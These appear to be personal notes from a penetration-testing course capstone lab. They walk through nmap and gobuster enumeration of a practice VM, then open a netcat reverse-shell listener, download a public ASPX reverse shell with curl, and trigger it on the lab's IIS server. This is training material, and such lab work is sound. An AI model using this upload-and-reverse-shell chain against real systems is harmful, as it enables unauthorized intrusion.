4. **Capstone Lab**: Enumerate the machine VM #4. Find the web application and get access to the system. The flag can be found in **C:\inetpub\**.
HINT

5. Nmap to find open HTTP ports.
6. Explore the main page of the ports for file upload.
7. Upload a webshell and identify the web server for server-side scripting (PHP or ASPX).
8. Index page provides hints on locating your webshell.

```bash
# IP: 192.168.123.192

# Enumeration
sudo nmap -sV -sC -v 192.168.123.192
	# Found open ports: 8000 seems like a website with upload file capabilities

```
![[Pasted image 20250313223937.png]]

```bash

# Listing directories and files
gobuster dir -u 192.168.123.192:8000 -w /usr/share/wordlists/dirb/common.txt
	# Can't find anything - guess we do file upload thing..? :O

# The text tells us to look "on the other port". Since there are 2 IIS servers, we look for the port 80 one.
gobuster dir -u 192.168.123.192:80
	# Seems like the server is linked to aspx!
```
![[Pasted image 20250313224600.png]]

```bash
# Open the reverse shell first
nc -lvnp 4444

# Uploading a reverse shell found at 
curl --output shell.aspx https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/refs/heads/master/shell.aspx

# Then, access the file we uploaded (tried the root, as no other path exists)
curl http://192.168.123.192:80/shell.aspx
```

![[Pasted image 20250313224524.png]]